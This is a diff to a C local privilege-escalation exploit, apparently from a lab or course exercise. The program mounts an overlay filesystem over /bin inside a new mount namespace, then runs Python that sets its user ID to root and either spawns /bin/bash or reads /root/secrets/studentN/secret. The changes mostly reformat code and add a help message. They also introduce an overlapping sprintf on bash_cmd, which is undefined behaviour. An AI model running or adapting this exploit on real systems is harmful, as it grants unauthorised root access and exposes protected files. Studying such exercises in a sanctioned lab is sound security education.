@@ -33,7 +33,8 @@ static int child_exec(void *stuff)
     mkdir("/tmp/haxhax/u",  0777);
     mkdir("/tmp/haxhax/o",  0777);
 
-    if (mount("overlay", "/tmp/haxhax/o", "overlay", MS_MGC_VAL, "lowerdir=/bin,upperdir=/tmp/haxhax/u,workdir=/tmp/haxhax/w") != 0) {
+    if (mount("overlay", "/tmp/haxhax/o", "overlay", MS_MGC_VAL,
+                "lowerdir=/bin, upperdir=/tmp/haxhax/u, workdir=/tmp/haxhax/w") != 0) {
 	    fprintf(stderr, "mount failed...\n");
     }
 
@@ -54,7 +55,8 @@ static int escalate_priv(char *bash_cmd)
 
         pid_t init = fork();
         if (init == 0) {
-            pid_t pid = clone(child_exec, child_stack + CHILD_STACK_SIZE, CLONE_NEWNS | SIGCHLD, NULL);
+            pid_t pid
+                = clone(child_exec, child_stack + CHILD_STACK_SIZE, CLONE_NEWNS | SIGCHLD, NULL);
             if (pid < 0) {
                 fprintf(stderr, "failed to create new mount namespace\n");
                 exit(-1);
@@ -85,8 +87,11 @@ int main(int argc, char **argv) {
                                     "os.setresuid(0,0,0); "
                                     "os.execl(";
     if (argc > 1) {
+        if (strcmp(argv[1], "--help") == 0 || strcmp(argv[1], "-h") == 0) {
+            printf("usage: %s [--help|-h][--run-bash|-b][--secret-num|-n num of secret]\n", argv[0]);
+        }
         if (strcmp(argv[1], "--run-bash") == 0 || strcmp(argv[1], "-b") == 0) {
-            strcat(bash_cmd, "'/bin/bash', 'bash');\"");
+            sprintf(bash_cmd, "%s'/bin/bash', 'bash');\"", bash_cmd);
         } else if (strcmp(argv[1], "--secret-num") == 0 || strcmp(argv[1], "-n") == 0) {
             if (argc < 3) {
                 fprintf(stderr, "please provide a number to a secret\n");
@@ -96,12 +101,10 @@ int main(int argc, char **argv) {
                 fprintf(stderr, "there are only 32 secrets\n");
                 return -1;
             }
-            strcat(bash_cmd, "'/bin/cat', 'cat', '/root/secrets/student");
-            strcat(bash_cmd, argv[2]);
-            strcat(bash_cmd, "/secret');\"");
+            sprintf(bash_cmd, "%s'/bin/cat', 'cat', '/root/secrets/student%s/secret');\"", bash_cmd, argv[2]);
         }
     } else {
-        strcat(bash_cmd, "'/bin/cat', 'cat', '/root/secrets/student1/secret');\"");
+        sprintf(bash_cmd, "%s'/bin/cat', 'cat', '/root/secrets/student1/secret');\"", bash_cmd);
     }
     return escalate_priv(bash_cmd);
 }
